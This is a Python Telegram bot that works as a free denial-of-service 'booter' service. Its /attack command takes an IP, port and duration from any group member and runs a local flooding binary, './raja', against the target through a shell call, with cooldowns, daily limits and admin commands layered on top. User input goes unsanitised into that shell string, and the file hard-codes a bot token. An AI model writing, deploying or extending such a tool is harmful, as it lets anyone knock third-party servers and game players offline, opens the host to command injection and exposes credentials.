#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading

# Insert your Telegram bot token here
bot = telebot.TeleBot('6838193855:AAHi1KDZv6Xgz_9yONP_dpF_TlrHcNQ03EU')

# Admin user IDs
admin_id = ["6512242172"]

# Group and channel details
GROUP_ID = "-1002180455734"  # The ID of the group where the bot operates
CHANNEL_USERNAME = "@kasukabe0"

# Default cooldown and attack limits
COOLDOWN_TIME = 280  # Cooldown in seconds
ATTACK_LIMIT = 15  # Max attacks per day

# Files to store user data
USER_FILE = "users.txt"

# Dictionary to store user states
user_data = {}
bgmi_cooldown = {}  # Cooldown tracker for each user

# Function to load user data from the file
def load_users():
    try:
        with open(USER_FILE, "r") as file:
            for line in file:
                user_id, attacks, last_reset = line.strip().split(',')
                user_data[user_id] = {
                    'attacks': int(attacks),
                    'last_reset': datetime.datetime.fromisoformat(last_reset),
                    'last_attack': None
                }
    except FileNotFoundError:
        pass

# Function to save user data to the file
def save_users():
    with open(USER_FILE, "w") as file:
        for user_id, data in user_data.items():
            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")

# Middleware to ensure users are joined to the channel
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# Function to log commands
def log_command(user_id, target, port, time):
    with open("command_logs.txt", "a") as log_file:
        log_file.write(f"{datetime.datetime.now()} - User: {user_id}, Target: {target}, Port: {port}, Time: {time}\n")

# Command to handle attacks
@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    
    # Ensure user is in the group
    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "First join the channel then attack. Join @kasukabe0 fir attack people in group")
        return

    # Ensure user is a member of the channel
    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"You must join {CHANNEL_USERNAME} to use this bot.")
        return

    # Check cooldown for regular users
    if user_id not in admin_id and user_id in bgmi_cooldown:
        cooldown_remaining = (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds
        if cooldown_remaining < COOLDOWN_TIME:
            bot.reply_to(message, f"Take Rest For A While {COOLDOWN_TIME - cooldown_remaining} seconds.")
            return

    # Parse command arguments
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "Error: PORT and TIME must be integers.")
        return

    if time_duration > 140:
        bot.reply_to(message, "Less lentils for free what else will it take 140 seconds.")
        return

    # Execute the attack via the binary
    full_command = f"./raja {target} {port} {time_duration} 800"
    try:
        bot.reply_to(message, f"FREE BOT H ATTACK KRO: {target}, Port: {port}, Time: {time_duration} seconds.")
        subprocess.run(full_command, shell=True)
        bot.reply_to(message, f"ATTACK KHATAM LODE: {target}, Port: {port}, Time: {time_duration} seconds.")
    except Exception as e:
        bot.reply_to(message, f"An error occurred while executing the attack: {str(e)}")
        return

    # Log command and update cooldown
    log_command(user_id, target, port, time_duration)
    bgmi_cooldown[user_id] = datetime.datetime.now()

# Admin command to reset a user's attack limit
@bot.message_handler(commands=['reset'])
def reset_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER RUN THIS COMMAND .")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /reset <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        user_data[user_id]['attacks'] = 0
        save_users()
        bot.reply_to(message, f"That's your limit {user_id} has been reset.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

# Admin command to adjust cooldown time
@bot.message_handler(commands=['setcooldown'])
def set_cooldown(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER RUN THIS COMMAND @offx_sahil.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return

    global COOLDOWN_TIME
    try:
        COOLDOWN_TIME = int(command[1])
        bot.reply_to(message, f"Cooldown time has been set to {COOLDOWN_TIME} seconds.")
    except ValueError:
        bot.reply_to(message, "Please provide a valid number of seconds.")

# Admin command to remove user data
@bot.message_handler(commands=['remove'])
def remove_user(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER RUN THIS COMMAND @offx_sahil.")
        return

    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return

    user_id = command[1]
    if user_id in user_data:
        del user_data[user_id]
        save_users()
        bot.reply_to(message, f"User data for {user_id} has been removed.")
    else:
        bot.reply_to(message, f"No data found for user {user_id}.")

# Admin command to view total and all users
@bot.message_handler(commands=['viewusers'])
def view_users(message):
    if str(message.from_user.id) not in admin_id:
        bot.reply_to(message, "ONLY OWNER RUN THIS COMMAND @offx_sahil.")
        return

    total_users = len(user_data)
    users_list = "\n".join([f"{user_id}: {data['attacks']} attacks" for user_id, data in user_data.items()])
    bot.reply_to(message, f"Total users: {total_users}\n\n{users_list}")

# Function to reset all daily limits automatically at midnight
def auto_reset():
    while True:
        now = datetime.datetime.now()
        seconds_until_midnight = ((24 - now.hour - 1) * 3600) + ((60 - now.minute - 1) * 60) + (60 - now.second)
        time.sleep(seconds_until_midnight)
        for user in user_data.values():
            user['attacks'] = 0
        save_users()

# Start auto-reset in a separate thread
reset_thread = threading.Thread(target=auto_reset, daemon=True)
reset_thread.start()

# Load user data on startup
load_users()

# Start polling
bot.polling()